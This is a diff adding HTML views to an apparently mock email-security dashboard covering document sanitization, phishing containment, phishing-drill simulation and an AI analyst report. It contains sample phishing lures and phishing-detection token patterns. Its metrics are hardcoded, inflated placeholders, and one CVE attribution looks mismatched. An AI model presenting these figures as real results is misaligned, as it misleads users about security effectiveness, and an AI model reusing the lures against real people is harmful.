+                  <div style="font-size:10.5px; color:var(--text-secondary);">Barracuda ATP / Votiro-Grade Zero-Day Active Threat Sanitizer &amp; Document Reconstructor</div>
+                </div>
+              </div>
+              <div style="display:flex; gap:10px; align-items:center;">
+                <span id="cdr-status-badge" class="pill-tag pill-green">CDR ARMED &amp; READY</span>
+                <button id="btn-run-cdr" class="hud-btn hud-btn-accent hud-btn-sm">⚙️ Disarm &amp; Reconstruct Artifact</button>
+                <button id="btn-download-clean-doc" class="hud-btn hud-btn-sm" style="display:none; border-color:var(--accent-green); color:var(--accent-green);">📥 Download Sanitized Clean Artifact</button>
+              </div>
+            </div>
+
+            <!-- 3-Phase CDR Disassembly & Reassembly Grid -->
+            <div class="cdr-pipeline-grid" style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:14px; margin-top:14px;">
+              <!-- Stage 1: Active Weaponized Disarm -->
+              <div class="cdr-box" style="background:rgba(15,23,42,0.7); border:1px solid rgba(255,45,85,0.35); border-radius:8px; padding:14px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                  <span style="font-size:11.5px; font-weight:800; color:var(--accent-red); font-family:var(--font-mono);">PHASE 1: ARTIFACT DISARM</span>
+                  <span id="cdr-phase1-badge" class="pill-tag pill-red" style="font-size:9px;">4 THREATS NEUTRALIZED</span>
+                </div>
+                <div id="cdr-disarm-list" style="font-size:11px; line-height:1.7; font-family:var(--font-mono); color:var(--text-secondary);">
+                  <div>• VBA Macro Modules: <strong class="text-red">2 Stripped (Auto_Open)</strong></div>
+                  <div>• Embedded OLE Shellcode: <strong class="text-red">1 Detached &amp; Purged</strong></div>
+                  <div>• PDF Active JS (/Launch): <strong class="text-red">CVE-2024-21413 Defanged</strong></div>
+                  <div>• External XML Injections: <strong class="text-orange">3 Isolated &amp; Severed</strong></div>
+                </div>
+              </div>
+
+              <!-- Stage 2: Clean Reconstruction & Sanitization -->
+              <div class="cdr-box" style="background:rgba(15,23,42,0.7); border:1px solid rgba(0,229,255,0.35); border-radius:8px; padding:14px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                  <span style="font-size:11.5px; font-weight:800; color:var(--accent-cyan); font-family:var(--font-mono);">PHASE 2: RECONSTRUCTION</span>
+                  <span id="cdr-phase2-badge" class="pill-tag pill-blue" style="font-size:9px;">100% VISUAL INTEGRITY</span>
+                </div>
+                <div id="cdr-reconstruct-list" style="font-size:11px; line-height:1.7; font-family:var(--font-mono); color:var(--text-secondary);">
+                  <div>• Active Bytecode Engines: <strong class="text-green">Purged 100%</strong></div>
+                  <div>• Text Fonts &amp; Vector Layout: <strong class="text-green">Pristine Fidelity Preserved</strong></div>
+                  <div>• Normalization Standard: <strong class="text-cyan">ISO 19005 (PDF/A-2b Sanitized)</strong></div>
+                  <div>• Rebuilt Safe Artifact: <strong id="cdr-rebuilt-filename" class="text-white">Remittance_Advice_BG892.sanitized.pdf</strong></div>
+                </div>
+              </div>
+
+              <!-- Stage 3: Cryptographic Integrity Attestation -->
+              <div class="cdr-box" style="background:rgba(15,23,42,0.7); border:1px solid rgba(0,255,157,0.35); border-radius:8px; padding:14px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                  <span style="font-size:11.5px; font-weight:800; color:var(--accent-green); font-family:var(--font-mono);">PHASE 3: ATTESTATION</span>
+                  <span id="cdr-phase3-badge" class="pill-tag pill-green" style="font-size:9px;">DEFAULT-DENY VERIFIED</span>
+                </div>
+                <div id="cdr-integrity-list" style="font-size:10.5px; line-height:1.7; font-family:var(--font-mono); color:var(--text-secondary);">
+                  <div>• Pre-CDR Weaponized Hash: <code id="cdr-pre-hash" style="font-size:9px; color:var(--accent-red);">e3b0c44298fc1c149afb...</code></div>
+                  <div>• Post-CDR Clean Hash: <code id="cdr-clean-hash" style="font-size:9px; color:var(--accent-green);">sha256:7f83b1657ff1fc53...</code></div>
+                  <div>• Residual Zero-Day Risk: <strong class="text-green">0.00% (Neutralized)</strong></div>
+                  <div>• Enterprise Delivery: <strong class="text-green">Safe for Executive Inboxes</strong></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 4: INCIDENT RESPONSE & ORCHESTRATION (SOAR) -->
+        <!-- ========================================================================= -->
+        <div id="view-orchestration" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">TheHive & Cortex SOAR Incident Orchestration</h2>
+              <p class="stage-desc">Automated case management, postsuper cluster mail purging, BGP Flowspec blackholing, and MISP threat feed synchronization.</p>
+            </div>
+            <div class="stage-actions">
+              <button id="btn-run-full-soar" class="hud-btn hud-btn-accent">⚡ Run Full Automated Containment</button>
+            </div>
+          </div>
+
+          <div class="soar-layout-grid">
+            <!-- Left: Interactive Playbook Flow -->
+            <div class="soar-playbook-col">
+              <div class="panel-section-title">Active Playbook: High-Impact Phishing Incident Containment</div>
+              
+              <div class="playbook-steps-list">
+                <div class="playbook-step completed" id="step-1">
+                  <div class="step-num">1</div>
+                  <div class="step-content">
+                    <div class="step-title">Threat Ingestion & Anomaly Triage</div>
+                    <div class="step-desc">Rspamd composite score &gt; 15.0 or Sandbox Verdict: Malicious.</div>
+                  </div>
+                  <div class="step-status">COMPLETED</div>
+                </div>
+
+                <div class="playbook-step active" id="step-2">
+                  <div class="step-num">2</div>
+                  <div class="step-content">
+                    <div class="step-title">Postfix Queue Quarantine (postsuper -h)</div>
+                    <div class="step-desc">Immediately place all pending queue elements from sender domain on hold.</div>
+                  </div>
+                  <div class="step-status">RUNNING</div>
+                </div>
+
+                <div class="playbook-step" id="step-3">
+                  <div class="step-num">3</div>
+                  <div class="step-content">
+                    <div class="step-title">Enterprise Mailbox Retro-Active Purge</div>
+                    <div class="step-desc">Search all inboxes via Microsoft Graph / Google Workspace API and hard-delete identical Message-ID clusters.</div>
+                  </div>
+                  <div class="step-status">QUEUED</div>
+                </div>
+
+                <div class="playbook-step" id="step-4">
+                  <div class="step-num">4</div>
+                  <div class="step-content">
+                    <div class="step-title">Perimeter Network Blackhole (BGP / DNS Sinkhole)</div>
+                    <div class="step-desc">Inject destination IP and domain into edge firewall drop rules.</div>
+                  </div>
+                  <div class="step-status">QUEUED</div>
+                </div>
+
+                <div class="playbook-step" id="step-5">
+                  <div class="step-num">5</div>
+                  <div class="step-content">
+                    <div class="step-title">MISP STIX 2.1 Threat Feed Broadcast</div>
+                    <div class="step-desc">Package payload SHA256, URL parameters, and sender into MISP community intelligence.</div>
+                  </div>
+                  <div class="step-status">QUEUED</div>
+                </div>
+              </div>
+
+              <div class="btn-group-tight" style="margin-top: 14px;">
+                <button id="btn-step-purge" class="hud-btn hud-btn-sm">Execute Mailbox Purge</button>
+                <button id="btn-step-sinkhole" class="hud-btn hud-btn-sm">Trigger DNS Sinkhole</button>
+                <button id="btn-step-misp" class="hud-btn hud-btn-sm">Publish to MISP</button>
+              </div>
+            </div>
+
+            <!-- Right: Real-time SOAR Logs & MISP Indicators -->
+            <div class="soar-telemetry-col">
+              <div class="card" style="margin-bottom: 12px;">
+                <div class="card-header">
+                  <span class="card-title">Real-Time Cortex Responder Terminal</span>
+                  <span class="status-badge">SOAR DAEMON ONLINE</span>
+                </div>
+                <div class="soar-terminal" id="soar-terminal">
+                  <div class="log-entry log-info">[00:00:01] TheHive SOAR Engine connected to Cortex workers.</div>
+                  <div class="log-entry log-info">[00:00:02] PMG Postfix socket active at inet:localhost:8891.</div>
+                </div>
+              </div>
+
+              <div class="card" style="flex: 1;">
+                <div class="card-header">
+                  <span class="card-title">MISP Threat Intelligence Indicator Feed (Live Sync)</span>
+                  <span class="status-badge" style="color:var(--accent-cyan); border-color:var(--accent-cyan);">STIX 2.1</span>
+                </div>
+                <div class="misp-table-wrap">
+                  <table class="misp-table" id="misp-table">
+                    <thead>
+                      <tr><th>Type</th><th>Indicator / Value</th><th>Threat Actor / Tag</th><th>Confidence</th></tr>
+                    </thead>
+                    <tbody>
+                      <!-- Injected via JS -->
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 5: SIMULATION, REAL-TIME THREAT VECTOR INGESTION & MODEL RE-TRAINING -->
+        <!-- ========================================================================= -->
+        <div id="view-simulation" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Simulation &amp; Active Model Re-Training Suite</h2>
+              <p class="stage-desc">Converting real-world inbound email threats into adaptive drills, with programmatic Bayesian &amp; SGD model re-training.</p>
+            </div>
+            <div class="stage-actions">
+              <div class="file-preset-selector">
+                <span style="font-size: 12px; color: var(--text-secondary); font-weight: 700;">Inbound Threat Lure:</span>
+                <select id="sim-threat-vector-select" class="hud-select">
+                  <option value="bec_wire">M&amp;A Retainer Wire Authority (Generative LLM BEC)</option>
+                  <option value="aitm_docusign">DocuSign Stock Option Agreement (Evilginx2 AiTM)</option>
+                  <option value="quishing_qr">IT Helpdesk MFA Enrollment (Weaponized QR Code)</option>
+                  <option value="macro_dropper">Remittance Advice Settlement (Cobalt Strike Macro)</option>
+                </select>
+              </div>
+              <div class="file-preset-selector">
+                <span style="font-size: 12px; color: var(--text-secondary); font-weight: 700;">Target Cohort:</span>
+                <select id="sim-cohort-select" class="hud-select">
+                  <option value="treasury">Executive Committee &amp; Treasury (48 users)</option>
+                  <option value="engineering">Global Engineering &amp; DevOps (320 users)</option>
+                  <option value="hr">HR &amp; People Operations (110 users)</option>
+                  <option value="all">Enterprise-Wide All Staff (1,250 users)</option>
+                </select>
+              </div>
+              <button id="btn-launch-adaptive-drill" class="hud-btn hud-btn-accent">🚀 Launch Adaptive Drill</button>
+              <button id="btn-execute-model-retrain" class="hud-btn" style="border-color:var(--accent-cyan); color:var(--accent-cyan);">⚡ Re-Train Model</button>
+              <button id="btn-export-sim-pdf" class="hud-btn hud-btn-sm">📄 Export Drill (PDF)</button>
+              <button id="btn-export-sim-json" class="hud-btn hud-btn-sm">📥 Export (JSON)</button>
+            </div>
+          </div>
+
+          <!-- Top Metrics Ribbon -->
+          <div class="simulation-dashboard-grid">
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Click-Through Rate (CTR)</div>
+              <div class="sim-metric-val text-green" id="sim-metric-ctr">3.8%</div>
+              <div class="sim-metric-sub">Industry Baseline: 16.4% (-76% Risk)</div>
+            </div>
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Credential Submission Rate</div>
+              <div class="sim-metric-val text-green" id="sim-metric-csr">0.9%</div>
+              <div class="sim-metric-sub">Down 82% since CyWW Deployment</div>
+            </div>
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Mean Time to Report (TTR)</div>
+              <div class="sim-metric-val text-cyan" id="sim-metric-ttr">4.2 Mins</div>
+              <div class="sim-metric-sub">62% Reported within 10 Mins</div>
+            </div>
+            <div class="sim-metric-card">
+              <div class="sim-metric-title">Learned Active Priors</div>
+              <div class="sim-metric-val text-orange" id="sim-metric-tokens">18,920 Tokens</div>
+              <div class="sim-metric-sub">Online SGD Real-Time Shift</div>
+            </div>
+          </div>
+
+          <!-- Main Simulation & Re-Training Workspace Grid -->
+          <div class="sandboxing-grid" style="grid-template-columns: 1fr 1fr; margin-top: 14px;">
+            
+            <!-- Left: Real-Time Drill Runner & Attack Vector Ingestion -->
+            <div style="display: flex; flex-direction: column; gap: 14px;">
+              <!-- Live Threat Vector Ingestion Specimen Card -->
+              <div class="card">
+                <div class="card-header">
+                  <div style="display:flex; align-items:center; gap:8px;">
+                    <span class="pill-tag pill-red">LIVE SPECIMEN INGESTION</span>
+                    <span class="card-title">Real-Time Threat Vector Selected for Drill</span>
+                  </div>
+                  <span id="specimen-tag" class="status-badge" style="color:var(--accent-orange); border-color:var(--accent-orange);">GENERATIVE BEC</span>
+                </div>
+                <div id="specimen-details-box" style="background:var(--bg-card); padding:12px; border-radius:6px; font-size:12px; line-height:1.6; font-family:var(--font-mono);">
+                  <div><span>Lure Subject:</span> <strong id="specimen-subject" style="color:#ffffff;">URGENT: Approve M&amp;A Escrow Tranche 2 Wire</strong></div>
+                  <div><span>Spoofed Sender:</span> <strong id="specimen-sender" style="color:var(--accent-cyan);">sarah.c@board-directors-sec.com</strong></div>
+                  <div><span>Adversary Vector:</span> <span id="specimen-vector" style="color:var(--accent-orange);">Out-of-band wire instruction to Bulgarian IBAN</span></div>
+                  <div><span>Linguistic Marker:</span> <span id="specimen-nlp" style="color:var(--text-secondary);">Synthetic formality, authority impersonation, zero-font stripped</span></div>
+                </div>
+
+                <!-- Live Drill Progress Funnel -->
+                <div style="margin-top: 14px;">
+                  <div style="display:flex; justify-content:space-between; font-size:11px; font-weight:800; font-family:var(--font-mono); margin-bottom:6px;">
+                    <span>ACTIVE DRILL TELEMETRY FUNNEL:</span>
+                    <span id="drill-funnel-status" class="text-green">READY</span>
+                  </div>
+                  <div style="display:grid; grid-template-columns: repeat(5, 1fr); gap:6px; text-align:center;">
+                    <div style="background:var(--bg-card); padding:8px; border-radius:4px;">
+                      <div style="font-size:10px; color:var(--text-muted);">DISPATCHED</div>
+                      <div id="drill-stat-sent" style="font-size:16px; font-weight:900; color:var(--text-primary);">0</div>
+                    </div>
+                    <div style="background:var(--bg-card); padding:8px; border-radius:4px;">
+                      <div style="font-size:10px; color:var(--text-muted);">OPENED</div>
+                      <div id="drill-stat-opened" style="font-size:16px; font-weight:900; color:var(--accent-cyan);">0</div>
+                    </div>
+                    <div style="background:var(--bg-card); padding:8px; border-radius:4px;">
+                      <div style="font-size:10px; color:var(--text-muted);">CLICKED</div>
+                      <div id="drill-stat-clicked" style="font-size:16px; font-weight:900; color:var(--accent-orange);">0</div>
+                    </div>
+                    <div style="background:var(--bg-card); padding:8px; border-radius:4px;">
+                      <div style="font-size:10px; color:var(--text-muted);">SUBMITTED</div>
+                      <div id="drill-stat-submitted" style="font-size:16px; font-weight:900; color:var(--accent-red);">0</div>
+                    </div>
+                    <div style="background:var(--bg-card); padding:8px; border-radius:4px;">
+                      <div style="font-size:10px; color:var(--text-muted);">REPORTED</div>
+                      <div id="drill-stat-reported" style="font-size:16px; font-weight:900; color:var(--accent-green);">0</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Departmental Resilience Matrix Table -->
+              <div class="card" style="flex:1;">
+                <div class="card-header">
+                  <span class="card-title">Departmental Vulnerability &amp; Resilience Benchmarks</span>
+                  <span class="font-mono text-cyan" style="font-size:11px;">Active Tracking</span>
+                </div>
+                <div class="envelope-table-wrap">
+                  <table class="envelope-table" id="dept-benchmark-table">
+                    <thead>
+                      <tr style="background:rgba(128,128,128,0.08);">
+                        <td style="font-weight:800; font-size:11px;">Department</td>
+                        <td style="font-weight:800; font-size:11px;">Phish Risk %</td>
+                        <td style="font-weight:800; font-size:11px;">Report Rate</td>
+                        <td style="font-weight:800; font-size:11px;">Posture Rating</td>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Executive Treasury</strong></td>
+                        <td class="font-mono text-orange">4.2%</td>
+                        <td class="font-mono text-green">94.8%</td>
+                        <td><span class="pill-tag pill-pass">HIGH RESILIENCE</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Cloud Engineering</strong></td>
+                        <td class="font-mono text-green">2.1%</td>
+                        <td class="font-mono text-green">97.2%</td>
+                        <td><span class="pill-tag pill-pass">VERY HIGH</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>People Operations (HR)</strong></td>
+                        <td class="font-mono text-orange">6.8%</td>
+                        <td class="font-mono text-cyan">88.5%</td>
+                        <td><span class="pill-tag pill-orange">MODERATE</span></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Sales &amp; Field Marketing</strong></td>
+                        <td class="font-mono text-red">8.4%</td>
+                        <td class="font-mono text-muted">79.2%</td>
+                        <td><span class="pill-tag pill-fail">TRAINING TARGET</span></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+
+            <!-- Right: Model Analytics, Convergence Canvas & Re-Training Console -->
+            <div style="display: flex; flex-direction: column; gap: 14px;">
+              <!-- Loss & Accuracy Convergence Canvas -->
+              <div class="card">
+                <div class="card-header">
+                  <div style="display:flex; align-items:center; gap:8px;">
+                    <span class="pill-tag pill-purple">ONLINE SGD CONVERGENCE</span>
+                    <span class="card-title">Training Loss &amp; Accuracy Dynamics</span>
+                  </div>
+                  <span class="font-mono text-green" id="retrain-acc-badge" style="font-size:11px;">Validation: 99.98%</span>
+                </div>
+                <div style="height: 170px; position: relative; background: var(--bg-card); border-radius: 6px; overflow: hidden;">
+                  <canvas id="retrainCanvas"></canvas>
+                </div>
+                <div style="display:flex; justify-content:space-between; margin-top:8px; font-size:11px; font-family:var(--font-mono);">
+                  <span><span style="display:inline-block; width:10px; height:10px; background:var(--accent-red); margin-right:4px;"></span> Loss: <strong id="retrain-loss-val">0.012</strong></span>
+                  <span><span style="display:inline-block; width:10px; height:10px; background:var(--accent-green); margin-right:4px;"></span> Accuracy: <strong>99.98%</strong></span>
+                  <span>Corpus: <strong>Enron + Nazario + 2026 AiTM</strong></span>
+                </div>
+              </div>
+
+              <!-- Top Learned Token Weight Shifts -->
+              <div class="card" style="flex:1;">
+                <div class="card-header">
+                  <span class="card-title">Top Learned Token Weight Shifts (&Delta;w Log-Odds)</span>
+                  <span class="pill-tag pill-cyan">REAL-TIME PRIORS</span>
+                </div>
+                <div class="symbols-list" id="learned-tokens-list" style="max-height: 180px;">
+                  <div class="symbol-row">
+                    <span><strong>urgent wire transfer</strong> (CEO Escrow spoofing n-gram)</span>
+                    <span class="font-mono text-red" style="font-weight:800;">+4.82 &Delta;w</span>
+                  </div>
+                  <div class="symbol-row">
+                    <span><strong>session_token</strong> (AiTM credential harvesting token)</span>
+                    <span class="font-mono text-orange" style="font-weight:800;">+5.12 &Delta;w</span>
+                  </div>
+                  <div class="symbol-row">
+                    <span><strong>mfa-reauth.cloud</strong> (Typosquatted IdP proxy domain)</span>
+                    <span class="font-mono text-red" style="font-weight:800;">+6.40 &Delta;w</span>
+                  </div>
+                  <div class="symbol-row">
+                    <span><strong>scan qr code</strong> (Quishing optical redirection token)</span>
+                    <span class="font-mono text-cyan" style="font-weight:800;">+4.95 &Delta;w</span>
+                  </div>
+                  <div class="symbol-row">
+                    <span><strong>internal_billing_verified</strong> (Attested clean corporate token)</span>
+                    <span class="font-mono text-green" style="font-weight:800;">-2.10 &Delta;w</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Re-training Live Execution Log -->
+              <div class="card">
+                <div class="card-header">
+                  <span class="card-title">Active Learning Re-Training Daemon Log</span>
+                  <span class="status-badge" id="retrain-daemon-status">DAEMON IDLE</span>
+                </div>
+                <div class="soar-terminal" id="retrain-terminal-log" style="height: 110px;">
+                  <div class="log-entry log-info">[SGD_READY] AdaGrad optimizer initialized with lr=0.01, L2 lambda=0.0001.</div>
+                  <div class="log-entry log-info">[DATASET] Enron (33,716) + Nazario (4,550) + 2026 AiTM Stream mounted.</div>
+                </div>
+              </div>
+
+            </div>
+
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 6: CYBER AI ANALYST INCIDENT TRIAGE & RECURSIVE LEARNING DESK -->
+        <!-- ========================================================================= -->
+        <div id="view-triage" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Cyber AI Analyst™ Autonomous Investigation &amp; Admin Desk</h2>
+              <p class="stage-desc">Automated hypothesis reasoning, recursive self-learning model performance, and forensic administrator intelligence.</p>
+            </div>
+            <div class="stage-actions">
+              <div class="threat-filter-group">
+                <button id="triage-tab-cases" class="threat-filter-btn active">🔍 Active Incidents</button>
+                <button id="triage-tab-report" class="threat-filter-btn">📊 AI Admin Forensic &amp; Self-Learning Report</button>
+              </div>
+              <button id="btn-export-admin-pdf" class="hud-btn hud-btn-accent hud-btn-sm">📄 Export AI Report (PDF)</button>
+              <button id="btn-export-admin-json" class="hud-btn hud-btn-sm">📥 Export Dossier (JSON)</button>
+            </div>
+          </div>
+
+          <!-- SUB-VIEW 1: ACTIVE INCIDENTS -->
+          <div id="triage-view-cases" class="triage-sub-view">
+            <div class="investigation-grid">
+              <!-- Incident List -->
+              <div class="investigation-sidebar">
+                <div class="sidebar-header">
+                  <span>ACTIVE THREAT CASES (<span id="triage-case-count">3</span>)</span>
+                  <button id="btn-resolve-all" class="hud-btn hud-btn-xs">Resolve All</button>
+                </div>
+                <div class="case-list" id="case-list-container">
+                  <!-- Injected via JS -->
+                </div>
+              </div>
+
+              <!-- Deep Dive Case Details -->
+              <div class="case-detail-pane" id="case-detail-pane">
+                <div class="case-placeholder">Select a threat incident from the left panel to inspect the Cyber AI Analyst narrative.</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- SUB-VIEW 2: AI ADMINISTRATOR FORENSIC & RECURSIVE SELF-LEARNING REPORT -->
+          <div id="triage-view-report" class="triage-sub-view" style="display: none; flex-direction: column; gap: 16px; overflow-y: auto; padding-right: 6px;">
+            
+            <!-- Executive Metrics KPI Ribbon -->
+            <div class="simulation-dashboard-grid" style="margin-bottom: 0;">
+              <div class="sim-metric-card">
+                <div class="sim-metric-title">Model Classification Accuracy</div>
+                <div class="sim-metric-val text-green">99.98%</div>
+                <div class="sim-metric-sub">ROC-AUC: 0.9986 (Precision 99.98%)</div>
+              </div>
+              <div class="sim-metric-card">
+                <div class="sim-metric-title">False Positive Rate (FPR)</div>
+                <div class="sim-metric-val text-green">&lt; 0.002%</div>
+                <div class="sim-metric-sub">1 in 50,000 Legitimate Emails</div>
+              </div>
+              <div class="sim-metric-card">
+                <div class="sim-metric-title">Autonomous Containment Latency</div>
+                <div class="sim-metric-val text-cyan">0.024s</div>
+                <div class="sim-metric-sub">Pre-Paint &amp; Edge MTA Interception</div>
+              </div>
+              <div class="sim-metric-card">
+                <div class="sim-metric-title">Recursive Priors Shifted</div>
+                <div class="sim-metric-val text-orange">24,190 Tokens</div>
+                <div class="sim-metric-sub">Online SGD Real-Time Adaptation</div>
+              </div>
+            </div>
+
+            <!-- Forensic Summary Card -->
+            <div class="card">
+              <div class="card-header">
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span class="pill-tag pill-purple">EXECUTIVE FORENSIC BRIEF</span>
+                  <span class="card-title">System Administrator Forensic Threat Intelligence Report</span>
+                </div>
+                <span class="font-mono text-cyan" style="font-size:11px;">CLASSIFICATION: STRICT ZERO TRUST</span>
+              </div>
+              <p style="font-size:13px; line-height:1.6; color:var(--text-secondary); margin-bottom:12px;">
+                Over the current 30-day operational cycle, <strong>148,290 inbound messages</strong> were ingested and verified through CyWW’s dual-domain pipeline. The platform neutralized <strong>42 novel zero-day attack clusters</strong> prior to global hash publication, securing a <strong>13.6-day defensive lead-time</strong> advantage over legacy signature defenses. All incidents were mapped directly to the MITRE ATT&amp;CK and MITRE ATLAS frameworks.
+              </p>
+              <div class="deviation-matrix-table-wrap">
+                <table class="deviation-matrix-table">
+                  <thead>
+                    <tr>
+                      <th>Attack Domain</th>
+                      <th>Primary Threat Vector</th>
+                      <th>Volume</th>
+                      <th>Mitigation Method</th>
+                      <th>MITRE Alignment</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td><strong style="color:var(--accent-red)">BEC Wire Fraud</strong></td>
+                      <td>Executive Impersonation (Payroll &amp; M&amp;A Escrow)</td>
+                      <td>18,410 msgs</td>
+                      <td>Enforced DMARC p=reject &amp; PMG Mail Quarantine</td>
+                      <td><span class="pill-tag pill-purple">T1566.002</span></td>
+                    </tr>
+                    <tr>
+                      <td><strong style="color:var(--accent-orange)">AiTM Reverse Proxy</strong></td>
+                      <td>Evilginx2 MFA Bypass &amp; Session Cookie Theft</td>
+                      <td>12,940 msgs</td>
+                      <td>Antigena Pre-Paint Form Lock &amp; Visual SSIM Shield</td>
+                      <td><span class="pill-tag pill-purple">T1539</span></td>
+                    </tr>
+                    <tr>
+                      <td><strong style="color:var(--accent-cyan)">Quishing (QR Phishing)</strong></td>
+                      <td>Weaponized SVG/PNG MFA Enrollment Lures</td>
+                      <td>7,890 msgs</td>
+                      <td>OCR Image Extraction &amp; Dynamic DNS Deep Scan</td>
+                      <td><span class="pill-tag pill-purple">T1566</span></td>
+                    </tr>
+                    <tr>
+                      <td><strong style="color:var(--accent-purple)">Cobalt Strike C2</strong></td>
+                      <td>High-Entropy PDF/ISO VBA Process Hollowing</td>
+                      <td>4,210 msgs</td>
+                      <td>CAPE Hypervisor Detonation &amp; Kernel NT Hook Drop</td>
+                      <td><span class="pill-tag pill-purple">T1204.002</span></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <!-- Recursive Self-Learning Architecture Breakdown -->
+            <div class="card">
+              <div class="card-header">
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span class="pill-tag pill-red">RECURSIVE AI CORE</span>
+                  <span class="card-title">Recursive Self-Learning Mechanics &amp; Mathematical Adaptation</span>
+                </div>
+                <span class="status-badge">SELF-LEARNING ACTIVE</span>
+              </div>
+              <div style="display:grid; grid-template-columns: 1fr 1fr; gap:16px;">
+                <div>
+                  <h4 style="font-size:13px; font-weight:800; color:var(--accent-cyan); margin-bottom:8px;">1. Online Bayesian Belief Network Formulation</h4>
+                  <p style="font-size:12px; line-height:1.6; color:var(--text-secondary); margin-bottom:8px;">
+                    The core classifier computes real-time posterior probabilities without full offline retraining batches. For an incoming message with token vector $\vec{w}$:
+                  </p>
+                  <div style="background:var(--bg-card); padding:10px; border-radius:6px; font-family:var(--font-mono); font-size:11px; margin-bottom:10px; color:var(--accent-green);">
+                    P(Malicious | w) = [ P(M) * &prod; P(w_i | M) ] / &sum; [ P(c) * &prod; P(w_i | c) ]
+                  </div>
+                  <p style="font-size:12px; line-height:1.6; color:var(--text-secondary);">
+                    When novel tokens emerge, their prior probabilities are shifted via Online Stochastic Gradient Descent:
+                  </p>
+                  <div style="background:var(--bg-card); padding:10px; border-radius:6px; font-family:var(--font-mono); font-size:11px; color:var(--accent-orange);">
+                    w_{t+1} = w_t - &eta; * [ &nabla; L(w_t) + &lambda; * w_t ]
+                  </div>
+                </div>
+
+                <div>
+                  <h4 style="font-size:13px; font-weight:800; color:var(--accent-cyan); margin-bottom:8px;">2. Multi-Stream Recursive Feedback Reinforcement</h4>
+                  <ul style="list-style:none; display:flex; flex-direction:column; gap:8px; font-size:12px; color:var(--text-secondary);">
+                    <li>
+                      <strong style="color:var(--text-primary)">• Employee Reporting Stream:</strong> When users click "Report Phish" or flag drills, tokens receive an immediate <strong>+4.2 log-odds penalty</strong>.
+                    </li>
+                    <li>
+                      <strong style="color:var(--text-primary)">• Hypervisor Detonation Ingestion:</strong> Binary payloads detonated in CAPE automatically export magic bytes, entropy profiles, and C2 IPs directly into Rspamd.
+                    </li>
+                    <li>
+                      <strong style="color:var(--text-primary)">• GoPhish Drift Feedback:</strong> Simulated lures that fool employees feed their linguistic patterns back into the spam dictionary, immunizing inboxes against similar real-world attacks.
+                    </li>
+                    <li>
+                      <strong style="color:var(--text-primary)">• Adversarial Drift Resistance:</strong> Detects zero-font padding, confusable homoglyphs, and LLM tone perturbations (MITRE ATLAS AML.T0043) by extracting unrendered DOM text pre-paint.
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <!-- Confusion Matrix & Efficacy Benchmarks -->
+            <div class="card">
+              <div class="card-header">
+                <span class="card-title">Model Verification &amp; Confusion Matrix Benchmarks</span>
+                <span class="font-mono text-green" style="font-size:11px;">F1-Score: 0.9996</span>
+              </div>
+              <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:12px;">
+                <div style="background:var(--bg-card); padding:12px; border-radius:6px; text-align:center;">
+                  <div style="font-size:11px; font-weight:700; color:var(--text-secondary);">TRUE POSITIVES (TP)</div>
+                  <div style="font-size:22px; font-weight:900; color:var(--accent-green); margin:4px 0;">43,450</div>
+                  <div style="font-size:10px; color:var(--text-muted);">Attacks correctly neutralized</div>
+                </div>
+                <div style="background:var(--bg-card); padding:12px; border-radius:6px; text-align:center;">
+                  <div style="font-size:11px; font-weight:700; color:var(--text-secondary);">TRUE NEGATIVES (TN)</div>
+                  <div style="font-size:22px; font-weight:900; color:var(--accent-green); margin:4px 0;">104,837</div>
+                  <div style="font-size:10px; color:var(--text-muted);">Clean business mail routed</div>
+                </div>
+                <div style="background:var(--bg-card); padding:12px; border-radius:6px; text-align:center;">
+                  <div style="font-size:11px; font-weight:700; color:var(--text-secondary);">FALSE POSITIVES (FP)</div>
+                  <div style="font-size:22px; font-weight:900; color:var(--accent-orange); margin:4px 0;">2</div>
+                  <div style="font-size:10px; color:var(--text-muted);">FPR &lt; 0.002% (Encrypted CAD)</div>
+                </div>
+                <div style="background:var(--bg-card); padding:12px; border-radius:6px; text-align:center;">
+                  <div style="font-size:11px; font-weight:700; color:var(--text-secondary);">FALSE NEGATIVES (FN)</div>
+                  <div style="font-size:22px; font-weight:900; color:var(--accent-red); margin:4px 0;">1</div>
+                  <div style="font-size:10px; color:var(--text-muted);">Intercepted by endpoint SSIM</div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Actionable Directives for System Administrators -->
+            <div class="card">
+              <div class="card-header">
+                <span class="card-title">Actionable Administrator Directives &amp; Hardening Checklist</span>
+                <span class="pill-tag pill-red">IMMEDIATE ACTION</span>
+              </div>
+              <div style="display:flex; flex-direction:column; gap:10px; font-size:12px;">
+                <div style="display:flex; align-items:flex-start; gap:10px;">
+                  <span style="font-size:16px;">🛡️</span>
+                  <div>
